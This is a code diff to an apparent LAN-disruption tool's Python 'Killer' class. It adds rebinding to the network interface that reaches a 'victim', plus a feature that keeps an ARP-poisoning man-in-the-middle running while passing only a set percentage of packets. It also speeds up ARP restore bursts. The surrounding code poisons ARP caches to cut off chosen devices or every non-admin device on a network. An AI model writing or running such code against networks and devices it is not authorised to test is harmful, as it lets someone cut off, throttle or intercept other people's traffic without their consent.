@@ -5,7 +5,16 @@ import subprocess
 
 from networking.forwarder import MitmForwarder
 from tools.pfctl import ensure_pf_enabled, install_anchor, block_all_for, unblock_all_for
-from tools.utils import threaded, get_default_iface
+from tools.utils import (
+    threaded,
+    get_default_iface,
+    get_iface_for_victim_ip,
+    get_gateway_ip,
+    get_gateway_mac,
+    get_my_ip,
+    good_mac,
+    get_vendor,
+)
 from constants import *
 
 
@@ -82,6 +91,42 @@ class Killer:
             except Exception:
                 pass
             self._socket = None
+
+    def _sync_iface_for_victim(self, victim):
+        """
+        Rebind killer iface/router context to whatever NIC reaches victim['ip'].
+        Safe no-op if already on the right interface.
+        """
+        ip = victim.get('ip') if isinstance(victim, dict) else None
+        if not ip:
+            return
+        target = get_iface_for_victim_ip(ip, fallback=self.iface)
+        if (
+            getattr(target, 'guid', None) == getattr(self.iface, 'guid', None)
+            and getattr(target, 'name', None) == getattr(self.iface, 'name', None)
+        ):
+            return
+        self.iface = target
+        self._close_socket()
+        guid = self.iface.guid if getattr(self.iface, 'guid', None) else self.iface.name
+        try:
+            conf.iface = guid
+        except Exception:
+            pass
+        router_ip = get_gateway_ip(guid)
+        iface_ip = get_my_ip(guid)
+        router_mac = get_gateway_mac(iface_ip, router_ip)
+        self.router = {
+            'ip': router_ip,
+            'mac': router_mac,
+            'vendor': get_vendor(router_mac),
+            'type': 'Router',
+            'name': '',
+            'admin': True,
+        }
+        # Keep iface fields in sync for packet crafting / forwarder metadata.
+        self.iface.ip = iface_ip
+        self.iface.mac = good_mac(getattr(self.iface, 'mac', GLOBAL_MAC))
     
     def kill(self, victim, wait_after=2):
         """
@@ -92,12 +137,47 @@ class Killer:
         Registers ``self.killed`` on the caller thread so UI state (e.g. toggleKill)
         stays in sync; only the ARP loop runs in a background thread.
         """
+        self._sync_iface_for_victim(victim)
         mac = victim['mac']
-        # Desync recovery: if UI/backend think this MAC is already ON, still refresh the
-        # victim record and restart the ARP worker generation to reassert poisoning.
+        # Reassert path: even if already marked killed, refresh victim record and restart
+        # ARP worker generation so ON state recovers from stale/desynced workers.
         seq = self._next_op_seq(mac)
         self.killed[mac] = victim
+        self._stop_forwarder(mac)
         self._kill_arp_worker(victim, wait_after, seq)
+
+    def apply_percent_cut(self, victim, pass_percent=100, debug=False):
+        """
+        Keep MITM active and forward only a percentage of packets (both directions).
+        """
+        if victim['mac'] not in self.killed:
+            self.kill(victim)
+        pass_percent = max(0, min(100, int(pass_percent)))
+        pass_from_victim = pass_percent
+        pass_to_victim = pass_percent
+
+        if victim['mac'] in self.forwarders:
+            self.forwarders[victim['mac']].stop()
+        if not self.router.get('mac'):
+            return
+        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
+        if not iface_to_use or iface_to_use == 'NULL':
+            return
+        fw = MitmForwarder(debug=debug)
+        fw.start(
+            victim=victim,
+            router=self.router,
+            iface_name=iface_to_use,
+            iface_mac=self.iface.mac,
+            drop_from_victim=False,
+            drop_to_victim=False,
+            pass_from_victim_pct=pass_from_victim,
+            pass_to_victim_pct=pass_to_victim,
+        )
+        self.forwarders[victim['mac']] = fw
+
+    def disable_percent_cut(self, mac):
+        self._stop_forwarder(mac)
 
     @threaded
     def _kill_arp_worker(self, victim, wait_after=2, seq=0):
@@ -154,11 +234,13 @@ class Killer:
         Removes from ``self.killed`` on the caller thread before ARP restore runs
         in the background, so the UI does not race with _sync_killed_devices().
         """
+        self._sync_iface_for_victim(victim)
         seq = self._next_op_seq(victim['mac'])
         if victim['mac'] in self.killed:
             self.killed.pop(victim['mac'])
-        # Strong immediate restore burst so OFF reflects on network quickly.
-        self._restore_arp_now(victim, seq, repeats=3, delay_s=0.05)
+        # Immediate ARP burst with no sleep — sleeps belong in @threaded _unkill_restore_worker
+        # so the GUI thread returns instantly on Kill/Lag/Dupe OFF.
+        self._restore_arp_now(victim, seq, repeats=3, delay_s=0)
         self._unkill_restore_worker(victim, seq)
 
     def reinforce_restore(self, victim):
@@ -171,8 +253,9 @@ class Killer:
             return
         if mac in self.killed:
             return
+        self._sync_iface_for_victim(victim)
         seq = self._op_seq.get(mac, 0)
-        self._restore_arp_now(victim, seq, repeats=2, delay_s=0.05)
+        self._restore_arp_now(victim, seq, repeats=2, delay_s=0)
 
     def _restore_arp_now(self, victim, seq=0, repeats=1, delay_s=0.1):
         """Best-effort ARP restore; aborts if a newer op supersedes this sequence."""
@@ -232,6 +315,7 @@ class Killer:
             if device['admin']:
                 continue
             if device['mac'] not in self.killed:
+                self._sync_iface_for_victim(device)
                 self.kill(device)
 
     def unkill_all(self):
@@ -240,11 +324,12 @@ class Killer:
         """
         victims = list(self.killed.values())
         for victim in victims:
+            self._sync_iface_for_victim(victim)
             mac = victim['mac']
             seq = self._next_op_seq(mac)
             self.killed.pop(mac, None)
-            # Immediate restore burst for OFF parity with per-device unkill.
-            self._restore_arp_now(victim, seq, repeats=3, delay_s=0.05)
+            # Immediate restore burst for OFF parity with per-device unkill (no GUI-thread sleep).
+            self._restore_arp_now(victim, seq, repeats=3, delay_s=0)
             self._unkill_restore_worker(victim, seq)
             self._stop_forwarder(mac)
         for ip in list(self.pf_blocks):
